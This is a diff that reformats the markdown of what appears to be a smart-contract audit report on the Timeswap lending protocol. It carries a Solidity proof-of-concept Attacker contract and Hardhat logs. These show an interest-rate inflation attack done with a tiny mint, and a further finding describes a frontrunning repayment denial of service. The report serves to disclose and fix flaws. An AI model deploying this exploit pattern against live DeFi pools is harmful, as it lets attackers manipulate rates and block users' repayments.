@@ -213,7 +213,7 @@ The attack scenario is this: A malicious actor is able to hyper-inflate the inte
 
 Consider the following HardHat script:
 
-```
+```js
 const hre = require("hardhat");
 
 
@@ -294,7 +294,7 @@ main().then(()=>process.exit(0))
 
 First, the LP deploys their pool and contributes their desired amount of tokens with the below contract:
 
-```
+```solidity
 pragma solidity =0.8.4;
 
 import "hardhat/console.sol";
@@ -362,10 +362,11 @@ function timeswapMintCallback(
 ```
 
 Here are the initialization values:
-
-        uint112 xIncrease = 5_000 ether;
-        uint112 yIncrease = (APR*xIncrease)/(SEC_PER_YEAR*100);
-        uint112 zIncrease = (5*xIncrease)/3; //Static 167% CDP
+```solidity
+uint112 xIncrease = 5_000 ether;
+uint112 yIncrease = (APR*xIncrease)/(SEC_PER_YEAR*100);
+uint112 zIncrease = (5*xIncrease)/3; //Static 167% CDP
+```
 
 With this configuration, I've calculated the interest rate to borrow on this pool using the functions defined here: <https://timeswap.gitbook.io/timeswap/deep-dive/borrowing>
 to  be:
@@ -381,100 +382,101 @@ zMax: 1666.6666666666667
 Around 1% to 15%.
 
 Then, the attacker comes along (see line containing `let atakcontrak` and after). The attacker deploys the following contract:
+```solidity
+pragma solidity =0.8.4;
 
-    pragma solidity =0.8.4;
+import "hardhat/console.sol";
+import {ITimeswapMintCallback} from "./interfaces/callback/ITimeswapMintCallback.sol";
+import {IPair} from "./interfaces/IPair.sol";
+import {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol';
+interface TestTokenAtt is IERC20{
+    function mmint(uint256 amount) external;
+}
 
-    import "hardhat/console.sol";
-    import {ITimeswapMintCallback} from "./interfaces/callback/ITimeswapMintCallback.sol";
-    import {IPair} from "./interfaces/IPair.sol";
-    import {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol';
-    interface TestTokenAtt is IERC20{
-        function mmint(uint256 amount) external;
+contract Attacker is ITimeswapMintCallback {
+
+    uint112 constant SEC_PER_YEAR = 31556926;
+    TestTokenAtt internal jtok;
+    TestTokenAtt internal usdc;
+
+constructor(address _jtok, address _usdc){
+    jtok = TestTokenAtt(_jtok);
+    jtok.mmint(10_000 ether);
+    usdc = TestTokenAtt(_usdc);
+    usdc.mmint(10_000 ether);
+}
+
+function timeswapMint(uint maturity, uint112 APR, address pairAddress) public{
+    uint256 maturity = maturity;
+    console.log("Maturity: ", maturity);
+    address liquidityTo = address(this);
+    address dueTo = address(this);
+    uint112 xIncrease = 3;
+    uint112 yIncrease = 1000000000000000;
+    uint112 zIncrease = 5; //Static 167% CDP
+    IPair(pairAddress).mint(maturity, liquidityTo, dueTo, xIncrease, yIncrease, zIncrease, "");
+}
+
+
+function timeswapMintCallback(
+        uint112 assetIn,
+        uint112 collateralIn,
+        bytes calldata data
+    ) override external{
+        jtok.mmint(100_000 ether);
+        usdc.mmint(100_000 ether);
+        console.log("Asset requested:", assetIn);
+        console.log("Collateral requested:", collateralIn);
+        //check before
+        uint256 beforeJtok = jtok.balanceOf(msg.sender);
+        console.log("Attacker jtok before", beforeJtok);
+        //transfer
+        jtok.transfer(msg.sender, assetIn);
+        //check after
+        uint256 afterJtok = jtok.balanceOf(msg.sender);
+        console.log("Attacker jtok after", afterJtok);
+        //check before
+        uint256 beforeUsdc = usdc.balanceOf(msg.sender);
+        console.log("Attacker USDC  before", beforeUsdc);
+        //transfer
+        usdc.transfer(msg.sender, collateralIn);
+        //check after
+        uint256 afterUsdc = usdc.balanceOf(msg.sender);
+        console.log("Attacker USDC After", afterUsdc);
+        
     }
-
-    contract Attacker is ITimeswapMintCallback {
-
-        uint112 constant SEC_PER_YEAR = 31556926;
-        TestTokenAtt internal jtok;
-        TestTokenAtt internal usdc;
-
-    constructor(address _jtok, address _usdc){
-        jtok = TestTokenAtt(_jtok);
-        jtok.mmint(10_000 ether);
-        usdc = TestTokenAtt(_usdc);
-        usdc.mmint(10_000 ether);
-    }
-
-    function timeswapMint(uint maturity, uint112 APR, address pairAddress) public{
-        uint256 maturity = maturity;
-        console.log("Maturity: ", maturity);
-        address liquidityTo = address(this);
-        address dueTo = address(this);
-        uint112 xIncrease = 3;
-        uint112 yIncrease = 1000000000000000;
-        uint112 zIncrease = 5; //Static 167% CDP
-        IPair(pairAddress).mint(maturity, liquidityTo, dueTo, xIncrease, yIncrease, zIncrease, "");
-    }
-
-
-    function timeswapMintCallback(
-            uint112 assetIn,
-            uint112 collateralIn,
-            bytes calldata data
-        ) override external{
-            jtok.mmint(100_000 ether);
-            usdc.mmint(100_000 ether);
-            console.log("Asset requested:", assetIn);
-            console.log("Collateral requested:", collateralIn);
-            //check before
-            uint256 beforeJtok = jtok.balanceOf(msg.sender);
-            console.log("Attacker jtok before", beforeJtok);
-            //transfer
-            jtok.transfer(msg.sender, assetIn);
-            //check after
-            uint256 afterJtok = jtok.balanceOf(msg.sender);
-            console.log("Attacker jtok after", afterJtok);
-            //check before
-            uint256 beforeUsdc = usdc.balanceOf(msg.sender);
-            console.log("Attacker USDC  before", beforeUsdc);
-            //transfer
-            usdc.transfer(msg.sender, collateralIn);
-            //check after
-            uint256 afterUsdc = usdc.balanceOf(msg.sender);
-            console.log("Attacker USDC After", afterUsdc);
-            
-        }
-    }
+}
+```
 
 Which contains the following settings for a mint:
-
-        uint112 xIncrease = 3;
-        uint112 yIncrease = 1000000000000000;
-        uint112 zIncrease = 5; //Static 167% CDP
+```solidity
+uint112 xIncrease = 3;
+uint112 yIncrease = 1000000000000000;
+uint112 zIncrease = 5; //Static 167% CDP
+```
 
 According to my logs in hardhat:
 
 ```
-    Maturity:  1641859791
-    Callback before: 8333825816710789998373
-    Asset requested: 3
-    Collateral requested: 6
-    Attacker jtok before 5000000000000000000000
-    Attacker jtok after 5000000000000000000003
-    Attacker USDC  before 8333825816710789998373
-    Attacker USDC After 8333825816710789998379
-    Callback after: 8333825816710789998379
-    Callback expected after: 8333825816710789998379
-
+Maturity:  1641859791
+Callback before: 8333825816710789998373
+Asset requested: 3
+Collateral requested: 6
+Attacker jtok before 5000000000000000000000
+Attacker jtok after 5000000000000000000003
+Attacker USDC  before 8333825816710789998373
+Attacker USDC After 8333825816710789998379
+Callback after: 8333825816710789998379
+Callback expected after: 8333825816710789998379
 ```
 
 The attacker is only required to pay 3 wei of Asset Token and 6 wei of Collateral token. However, after the attacker's malicious mint is up, the interest rate becomes:
-
-    yMax: 0.0002047533146923118
-    Min Interest Rate: 0.40383657499999975
-    Max Interest Rate: 6.461385199999996
-    zMax: 1666.6666666666667
-
+```
+yMax: 0.0002047533146923118
+Min Interest Rate: 0.40383657499999975
+Max Interest Rate: 6.461385199999996
+zMax: 1666.6666666666667
+```
 Between 40 and 646 percent.
 
 xyz values before and after:
@@ -835,7 +837,7 @@ an attacker can see it and frontrun to repay a single token for his debt (since 
 and since your solidity version is above 0.8.0 the line:
 `due.debt -= assetsIn[i];` will revert due to underflow
 
-The attacker can keep doing it everytime the user is going to pay and since 1 token is baisicly 0$ (18 decimals) the attacker doesn't lose real money
+The attacker can keep doing it everytime the user is going to pay and since 1 token is baisicly 0\$ (18 decimals) the attacker doesn't lose real money
 
 #### Impact
 
@@ -845,7 +847,7 @@ A DoS on every user that  repay his full debt (or enough that the difference bet
 
 From solidity docs
 
-    Since Solidity 0.8.0, all arithmetic operations revert on over- and underflow by default, thus making the use of these libraries unnecessary.
+Since Solidity 0.8.0, all arithmetic operations revert on over- and underflow by default, thus making the use of these libraries unnecessary.
 
 #### Recommended Mitigation Steps
 
